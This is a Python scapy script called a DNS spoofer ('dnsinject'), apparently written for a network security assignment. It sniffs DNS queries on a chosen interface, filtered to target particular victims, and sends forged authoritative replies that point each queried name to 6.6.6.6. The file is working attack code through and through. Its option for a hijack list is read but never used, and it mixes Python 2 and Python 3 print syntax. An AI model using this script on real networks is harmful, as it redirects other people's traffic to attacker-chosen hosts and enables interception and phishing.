#!/usr/bin/env python
from scapy.all import *
import argparse

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP


def id_generator(size=6, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


def dns_spoof(pkt):
    if pkt.dport == 53:
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
        send(spoofed_pkt)
        print('injected')


def main():
    parser = argparse.ArgumentParser(description='DNS spoofer.')

    parser.add_argument('-i', help='Listen on network device <interface> (e.g., eth0). If not specified,\
                        dnsinject should select a default interface to listen on. The same\
                        interface should be used for packet injection.', type=str,
                        required=False, default='wlp1s0')

    parser.add_argument('-f', help="Read a list of IP address and hostname pairs specifying the hostnames to\
                        be hijacked. If '-f' is not specified, dnsinject should forge replies for\
                        all observed requests with the local machine's IP address as an answer.",
                        type=str, required=False, default=None)

    parser.add_argument('expression', help="A BPF filter that specifies a subset of the traffic to be\
                        monitored. This option is useful for targeting a single or a set of particular\
                        victims.",
                        type=str, default=None)

    args = parser.parse_args()
    print args

    if args.f is not None:
        f = open(args.f, 'r')
        for line in f:
            print(line)

        f.close()

    sniff(iface=args.i, filter=args.expression, prn=dns_spoof, lfilter=lambda x: x.haslayer(DNSQR))


if __name__ == "__main__":
    main()
